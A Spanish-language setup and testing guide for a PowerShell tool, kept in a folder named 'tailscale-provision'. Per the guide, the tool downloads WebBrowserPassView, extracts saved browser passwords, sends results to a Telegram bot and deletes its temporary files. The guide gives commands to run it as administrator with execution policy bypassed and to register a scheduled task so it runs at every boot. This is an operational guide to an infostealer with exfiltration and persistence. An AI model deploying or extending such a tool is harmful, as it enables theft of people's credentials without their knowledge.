# 🧪 GUÍA DE PRUEBA - WebBrowserPassView

## 📊 ESTADO ACTUAL

```
✅ wbpv                 → Script principal (sin extensión)
✅ wbpv.ps1             → Script principal (.ps1) - RECOMENDADO
✅ test-wbpv.ps1        → Script de prueba simple
📋 wbpv-old.ps1.bak     → Backup del archivo anterior (ignorar)
```

---

## 🚀 OPCIÓN 1: PRUEBA SIMPLE (Recomendado)

```powershell
# Abrir PowerShell como ADMINISTRADOR
# Luego ejecutar:

cd C:\Users\USER\tailscale-provision
.\test-wbpv.ps1
```

**Esto hará:**
- ✅ Verifica que existen archivos necesarios
- ✅ Ejecuta o wbpv o wbpv.ps1
- ✅ Muestra resultado con colores
- ✅ Indica dónde revisar los resultados

---

## 🔧 OPCIÓN 2: EJECUCIÓN DIRECTA

```powershell
# Abrir PowerShell como ADMINISTRADOR
# Luego ejecutar:

cd C:\Users\USER\tailscale-provision
.\wbpv.ps1
```

**Resultado esperado:**
- 📁 Se crean directorios en `C:\ProgramData\WebBrowserPassView`
- ⬇️ Descarga WBPV y 7z
- 🔑 Extrae contraseñas
- 📱 Envía notificación a Telegram
- 🧹 Limpia archivos temporales

---

## 📋 PREREQUISITOS

### ✅ El .env debe estar configurado

```powershell
# Verificar que el .env existe
Get-Content .env | Select-String "TELEGRAM"
```

Deberías ver:
```
TELEGRAM_BOT_TOKEN=[ENC]...  (si está encriptado) o valor
TELEGRAM_CHAT_ID=[ENC]...    (si está encriptado) o valor
```

### ✅ El .env debe estar encriptado (OPCIONAL pero RECOMENDADO)

```powershell
# Si aún no lo has hecho:
.\setup-secure-env.ps1
```

---

## 🔍 VERIFICAR RESULTADOS

### 1️⃣ Ver Logs

```powershell
# Log de ejecución
Get-Content "logs\wbpv.log"

# O ver últimas líneas
Get-Content "logs\wbpv.log" -Tail 50
```

### 2️⃣ Ver Contraseñas Extraídas

```powershell
# Ubicación con credenciales
Get-ChildItem "C:\ProgramData\WebBrowserPassView\tools\mis_passwords.json"

# Ver contenido (JSON)
Get-Content "C:\ProgramData\WebBrowserPassView\tools\mis_passwords.json" | ConvertFrom-Json
```

### 3️⃣ Verificar Notificación Telegram

En tu chat de Telegram deberías recibir mensajes como:
```
[INFO] 🔧 Creando directorios de trabajo...
[INFO] ⬇️  Descargando WebBrowserPassView...
✅ Contraseñas extraídas exitosamente
```

---

## ⚙️ EJECUCIÓN CON PARÁMETROS (Avanzado)

```powershell
# Con token y chat ID explícitos
.\wbpv.ps1 `
    -TelegramToken "tu_token_aquí" `
    -TelegramChatId "tu_chat_id_aquí"

# Con .env personalizado
.\wbpv.ps1 -EnvFile "C:\config\.env_custom"
```

---

## 🐛 PROBLEMAS COMUNES

### ❌ "Acceso denegado"

**Causa:** No ejecutado como Administrador

**Solución:**
```powershell
# Click derecho en PowerShell → "Ejecutar como administrador"
```

### ❌ "El archivo para ejecutar se rechazó"

**Causa:** Política de ejecución restrictiva

**Solución:**
```powershell
# Cambiar para esta sesión (temporal)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# O ejecutar con parámetro
powershell -ExecutionPolicy Bypass -File ".\test-wbpv.ps1"
```

### ❌ "No se envían mensajes a Telegram"

**Causa:** Token o Chat ID inválido/no encriptado correctamente

**Solución:**
```powershell
# 1. Verificar .env
Get-Content .env | Select-String "TELEGRAM"

# 2. Probar desencriptación
.\demo-security.ps1

# 3. Ver logs
Get-Content "logs\cleanup.log"
```

### ❌ "Error al descargar WBPV"

**Causa:** Sin conexión a internet o servidor caído

**Solución:**
```powershell
# Verificar conexión
Test-NetConnection -ComputerName "www.nirsoft.net" -Port 443

# Reintentar
.\test-wbpv.ps1
```

---

## 📊 FLUJO DE EJECUCIÓN

```
┌─────────────────────────────────────────┐
│  .\test-wbpv.ps1 (Script de Prueba)     │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│  Verifica archivos necesarios            │
│  • wbpv EXISTS ✓                         │
│  • .env EXISTS ✓                         │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│  Ejecuta: .\wbpv                        │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│  Script WBPV Principal                  │
│  ├─ Carga variables desde .env          │
│  ├─ Crea directorios                    │
│  ├─ Descarga WBPV + 7z                  │
│  ├─ Extrae con contraseña               │
│  ├─ Ejecuta WebBrowserPassView          │
│  ├─ Envía a Telegram                    │
│  ├─ Limpia temporales                   │
│  └─ Registra en log                     │
└────────────────┬────────────────────────┘
                 │
                 ▼
        ✅ COMPLETADO
```

---

## 📝 COMANDOS RÁPIDOS

```powershell
# Ejecutar prueba simple
.\test-wbpv.ps1

# Ejecutar WBPV directamente
.\wbpv.ps1

# Ver últimos logs
Get-Content "logs\wbpv.log" -Tail 20

# Ver contraseñas (JSON)
Get-Content "C:\ProgramData\WebBrowserPassView\tools\mis_passwords.json" | ConvertFrom-Json | Format-Table

# Limpiar logs
Remove-Item "logs\*" -Force

# Mi encriptación está OK?
.\demo-security.ps1

# ¿Necesito re-encriptar?
.\setup-secure-env.ps1
```

---

## ✅ CHECKLIST PRE-PRUEBA

- [ ] ✅ Ejecutando como **Administrador**
- [ ] ✅ `.env` configurado con credenciales
- [ ] ✅ `.env` encriptado (opcional)
- [ ] ✅ **Telegram token y chat ID válidos**
- [ ] ✅ Conexión a internet disponible
- [ ] ✅ PowerShell 5.1+ (Windows 10+)

---

## 🎯 PRÓXIMOS PASOS DESPUÉS DE PRUEBA

✅ **Si la prueba funcionó:**
1. Ejecuta: `.\create-wbpv-task.ps1 -Clean`
2. Verifica que se creó la tarea programada
3. Reinicia Windows (se ejecutará automáticamente)

❌ **Si hay errores:**
1. Revisa los logs: `Get-Content logs\*.log`
2. Ejecuta: `.\demo-security.ps1` (verificar criptografía)
3. Prueba manualmente: `.\test-wbpv.ps1 -Verbose`

---

## 📞 COMANDOS DE DEBUG

```powershell
# Ver errores detallados
$ErrorActionPreference = 'Continue'
.\wbpv.ps1 -ErrorAction Stop -Verbose

# Trace paso a paso
Trace-Command -Name "CommandExecution" -Expression { .\wbpv.ps1 }

# Ver todas las variables cargadas
.\wbpv.ps1 -ErrorAction Stop | Out-Host
```

---

**¡Listo para probar!** 🚀

Ejecuta: `.\test-wbpv.ps1`
